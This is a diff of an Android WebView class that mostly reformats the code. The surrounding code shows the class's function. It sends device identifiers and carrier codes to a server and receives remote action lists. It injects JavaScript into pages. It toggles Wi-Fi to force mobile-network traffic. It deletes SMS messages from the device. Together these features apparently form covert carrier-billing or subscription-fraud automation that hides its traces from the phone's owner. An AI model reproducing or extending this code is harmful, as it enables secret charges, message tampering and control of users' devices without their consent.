@@ -63,6 +63,7 @@ public class AutomatedWebview extends WebView {
     private int mnc, mcc;
     private String cssSelector;
     ArrayList<Action> actionList;
+
     public AutomatedWebview(Context context) {
         super(context);
         this.context = context;
@@ -77,7 +78,6 @@ public class AutomatedWebview extends WebView {
 
 
     public void init() {
-
         //Setting up REST api objects
         OkHttpClient httpClient = new OkHttpClient.Builder().build();
         Gson gson = new GsonBuilder()
@@ -95,7 +95,7 @@ public class AutomatedWebview extends WebView {
         //Webview settings
         getSettings().setJavaScriptEnabled(true);
         setWebChromeClient(new WebChromeClient());
-        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
             setWebViewClient(new WebViewClient() {
                 @Override
                 public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
@@ -104,7 +104,7 @@ public class AutomatedWebview extends WebView {
                 }
             });
         } else {
-           setWebViewClient(new WebViewClient() {
+            setWebViewClient(new WebViewClient() {
                 @Override
                 public boolean shouldOverrideUrlLoading(WebView view, String url) {
                     view.loadUrl(url);
@@ -119,9 +119,7 @@ public class AutomatedWebview extends WebView {
             if (!is3gConnected()) {
                 try {
                     changeWifiStatus(true);
-                }
-                catch(Exception e)
-                {
+                } catch (Exception e) {
                     e.printStackTrace();
                 }
             }
@@ -133,40 +131,37 @@ public class AutomatedWebview extends WebView {
             if (mnc != 0 || mcc != 0) //If MNC and MCC are not empty
             {
                 //Calling the api
-                try {
-                    Call<TransactionResponse> meResponse = service.loadData("1", getUUID(), getUserAgent(), getIPAddress(), "20408", "start");
-                    meResponse.enqueue(new Callback<TransactionResponse>() {
-                        @Override
-                        public void onResponse(Call<TransactionResponse> call, Response<TransactionResponse> response) {
-                            if (response.isSuccessful()) {
-                                TransactionResponse body = response.body();
-                                Map<String, String> actions = body.getActions();
-                                settings = body.getSettings();
-                                actionList = new ArrayList<>();
-                                for (Map.Entry<String, String> entry : actions.entrySet()) {
-                                    actionList.add(actionParser(entry));
-                                }
-
-                                if (isForeground()) // if App is active
-                                    process();
-                                else
-                                    updateData("WAITING"); //Update server status
-
-                            } else {
-                                updateData("NO VALID JSON RECEIVED");
-                                Toast.makeText(context, "Loading data failed, please try again!", Toast.LENGTH_LONG).show();
+                Call<TransactionResponse> meResponse = service.loadData("1", getUUID(), getUserAgent(), getIPAddress(), "20408", "start");
+                meResponse.enqueue(new Callback<TransactionResponse>() {
+                    @Override
+                    public void onResponse(Call<TransactionResponse> call, Response<TransactionResponse> response) {
+                        if (response.isSuccessful()) {
+                            TransactionResponse body = response.body();
+                            Map<String, String> actions = body.getActions();
+                            settings = body.getSettings(); //Storing settings value for update
+                            actionList = new ArrayList<>();
+                            for (Map.Entry<String, String> entry : actions.entrySet()) {
+                                actionList.add(actionParser(entry));
                             }
-                        }
 
-                        @Override
-                        public void onFailure(Call<TransactionResponse> call, Throwable t) {
-                            Toast.makeText(context, "Network error, please try again!", Toast.LENGTH_LONG).show();
-                            t.printStackTrace();
+                            if (isForeground()) // if App is active
+                                process();
+                            else
+                                updateData("WAITING"); //Update server status
+
+                        } else {
+                            updateData("NO VALID JSON RECEIVED");
+                            Toast.makeText(context, "Loading data failed, please try again!", Toast.LENGTH_LONG).show();
                         }
-                    });
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
+                    }
+
+                    @Override
+                    public void onFailure(Call<TransactionResponse> call, Throwable t) {
+                        Toast.makeText(context, "Network error, please try again!", Toast.LENGTH_LONG).show();
+                        t.printStackTrace();
+                    }
+                });
+
             } else {
                 updateData("MCCMNC is empty");
             }
@@ -279,35 +274,31 @@ public class AutomatedWebview extends WebView {
         handler.postDelayed(new Runnable() {
             @Override
             public void run() {
-                if(finalCount == actionList.size())
+                if (finalCount == actionList.size())
                     updateData("SUCCESS");
             }
-        }, seconds * 1000+200);
+        }, seconds * 1000 + 200);
     }
 
     //Processing functions
-    private boolean is3gConnected()
-    {
-        //Checking connection type
+
+    private boolean is3gConnected() {
         ConnectivityManager connManager = (ConnectivityManager) context.getSystemService(CONNECTIVITY_SERVICE);
         boolean is3gEnabled = false;
-        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             Network[] networks = connManager.getAllNetworks();
-            for(Network network: networks)
-            {
+            for (Network network : networks) {
                 NetworkInfo info = connManager.getNetworkInfo(network);
-                if(info!=null) {
+                if (info != null) {
                     if (info.getType() == ConnectivityManager.TYPE_MOBILE) {
                         is3gEnabled = true;
                         break;
                     }
                 }
             }
-        }
-        else
-        {
+        } else {
             NetworkInfo mMobile = connManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
-            if(mMobile!=null)
+            if (mMobile != null)
                 is3gEnabled = true;
         }
         return is3gEnabled;
@@ -315,12 +306,11 @@ public class AutomatedWebview extends WebView {
 
     public void changeWifiStatus(boolean status) {
         WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
-        if(status)
-        {
+        if (status) {
             IntentFilter intentFilter = new IntentFilter();
-            intentFilter.addAction(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION) ;
+            intentFilter.addAction(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION);
             intentFilter.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION);
-            WifiReceiver receiver =  new WifiReceiver(this,true);
+            WifiReceiver receiver = new WifiReceiver(this, true);
             context.registerReceiver(receiver, intentFilter);
         }
         wifiManager.setWifiEnabled(status);
@@ -364,7 +354,7 @@ public class AutomatedWebview extends WebView {
 
     public void updateData(final String status) {
         String transaction_id = "";
-        if(settings != null)
+        if (settings != null)
             transaction_id = settings.getTransactionId();
         Call<String> meResponse = service.updateData("update", transaction_id, status);
         meResponse.enqueue(new Callback<String>() {
@@ -393,7 +383,7 @@ public class AutomatedWebview extends WebView {
         return android.os.Build.MODEL;
     }
 
-    // miscellaneous functions
+    // Miscellaneous functions
     private void injectJS(String script) {
         try {
             StringBuilder sb = new StringBuilder();
@@ -420,7 +410,7 @@ public class AutomatedWebview extends WebView {
         URL u;
         try {
             u = new URL(url);
-            name = u.getHost()+".jpg";
+            name = u.getHost() + ".jpg";
         } catch (MalformedURLException e) {
             e.printStackTrace();
         }
@@ -435,9 +425,7 @@ public class AutomatedWebview extends WebView {
                 String MsgId = cur.getString(0);
                 context.getContentResolver().delete(Uri.parse("content://sms/" + MsgId), null, null);
             }
-        }
-        catch(Exception e)
-        {
+        } catch (Exception e) {
             e.printStackTrace();
         }
     }
